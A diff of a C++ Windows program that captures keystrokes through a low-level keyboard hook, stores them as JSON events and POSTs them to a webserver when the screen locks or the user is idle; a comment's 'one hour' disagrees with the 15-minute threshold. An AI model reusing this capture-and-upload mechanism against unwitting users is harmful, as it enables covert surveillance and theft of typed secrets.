@@ -52,6 +52,12 @@ json data;
 CURL* curl;
 
 
+//RISK: EDGE CASE IMMENANT:
+bool isLocked = false;
+
+bool isIdle = false;
+
+
 std::string sJsonVersion = "0.0.0.1";
 int iEventCount = 0;
 
@@ -74,29 +80,28 @@ void addEvent(std::string key, int time){
 	data["events"].push_back(event);
 }
 
-void resetJson(){
-
-	std::cout << i << "Wiping events..." << std::endl;
-
-	//Wipe json
-	//data.clear();
-
-	//re-init
-	//data["app"] = "mkl";
-	//data["version"] = sJsonVersion;
-	data["events"] = json::array();
-}
-
 //Send the data to the webserver
-//bool sendData(CURL* curl, const std::string& payload){
-bool sendData(){
-	std::cout << i << "Sending data..." << std::endl;
+bool TrySendData(){
+
+	//std::cout << i << "data events: " << data["events"].size() << std::endl;
+
+	if (data["events"].size() <= 0){
+		std::cout << i << "no data to send." << std::endl;
+		return false;
+	}
+
+	std::cout << i << "Sending "<< data["events"].size() <<" events..." << std::endl;
 
 	std::string payload = data.dump(2);
 
+	//Clear all the key events from the josn
+	data["events"].clear();
+
+	//Add the data to the curl post
 	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
 	curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, payload.size());
 
+	//Trigger post request
 	CURLcode result = curl_easy_perform(curl);
 
 	if (result != CURLE_OK){
@@ -106,28 +111,46 @@ bool sendData(){
 
 	std::cout << k << "POST sent succesfully!" << std::endl;
 	
-	//Reset the json if send success
-	resetJson();
-
 	return true;
 }
 
 
+//Get idle time:
+DWORD GetIdleTimeMs() {
 
+	LASTINPUTINFO lii = {};
+	lii.cbSize = sizeof(LASTINPUTINFO);
+
+	//fallback on fail:
+	if (!GetLastInputInfo(&lii)) {return 0;}
+
+	DWORD tickCount = GetTickCount();
+
+	return tickCount - lii.dwTime;
+
+
+}
 /*=========================================
 	Callback Functions
 =========================================*/
 
 //Curl Callback
 void WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
-	std::cout << i << "callback fired" << std::endl;
+	//std::cout << i << "callback fired" << std::endl;
 }
 
 //keyboard hook callback function
 LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
+
 	
 	//Leave early if not a relevent msg
 	if (code < 0) { return CallNextHookEx(hHook, code, wParam, lParam);}
+
+	//if recv input, set idle status to false
+	if (isIdle){
+		std::cout << i << "User has returned." << std::endl;
+		isIdle = false;
+	}
 
 	KBDLLHOOKSTRUCT* ptrKBDStruct;
 	ptrKBDStruct = (KBDLLHOOKSTRUCT*)lParam;
@@ -272,13 +295,21 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam){
 	case WM_WTSSESSION_CHANGE:
 		if (wParam == WTS_SESSION_LOCK)
 		{	
-			std::cout << "User Locked Screen!" << std::endl;
+			if (!isLocked) {
 
-			//Send data to server!
-			sendData();
+				isLocked = true;
+				std::cout << "User Locked Screen!" << std::endl;
+
+				//Send data to server!
+				TrySendData();
+			}
+
 		}
 		else if (wParam == WTS_SESSION_UNLOCK)
-			std::cout << "User Unlocked Screen!" << std::endl;
+			if (isLocked) {
+				isLocked = false;
+				std::cout << "User Unlocked Screen!" << std::endl;
+			}
 		break;
 
 	//Catch shutdown or logoff
@@ -306,8 +337,6 @@ int main(int argc, char* argv[]){
 		CURL Setup
 	=========================================*/
 
-	//Global Initialization
-
 	curl = curl_easy_init();
 
 	if (!curl) {
@@ -324,7 +353,6 @@ int main(int argc, char* argv[]){
 	struct curl_slist* headers = nullptr;
 	headers = curl_slist_append(headers, "Content-Type: application/json");
 	curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-
 
 	/*=========================================
 		Path Setup
@@ -345,9 +373,7 @@ int main(int argc, char* argv[]){
 	} 
 	else {std::cout << k << pOut.filename() << " found." << std::endl;}
 
-	//Init json
-	resetJson();
-
+	
 	/*=========================================
 		Hook Setup
 	=========================================*/
@@ -396,14 +422,40 @@ int main(int argc, char* argv[]){
 	//Loop:
 	MSG msg;
 
-	while (GetMessage(&msg, 0, 0, 0)) {
+	while (true) {
+		//process messages:
+		while (PeekMessage(&msg, 0, 0, 0, PM_REMOVE)){
+			if (msg.message == WM_QUIT) {return 0;}
+		}
 
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 
-		//continues msg through queue
-		//PeekMessage(&msg, 0, 0, 0,PM_REMOVE);
-	}
+		/*=========================================
+			Check Idle Time
+		=========================================*/
 
+		static DWORD lastSendTick = 0;
+		DWORD idleMs = GetIdleTimeMs();
+
+		//1 hour = 3600 * 1000ms
+		const DWORD IDLE_THRESHOLD = 900000;
+
+		if (!isIdle){
+			if (idleMs >= IDLE_THRESHOLD) {
+				//Only send once per idle session:
+				if (GetTickCount() - lastSendTick > IDLE_THRESHOLD){
+					
+					TrySendData();
+
+					std::cout << i << "User has left." << std::endl;
+
+					//Set Idle status to true
+					isIdle = true;
+					lastSendTick = GetTickCount();
+				}
+			}
+		}		
+	}
 	return WN_SUCCESS;
 }
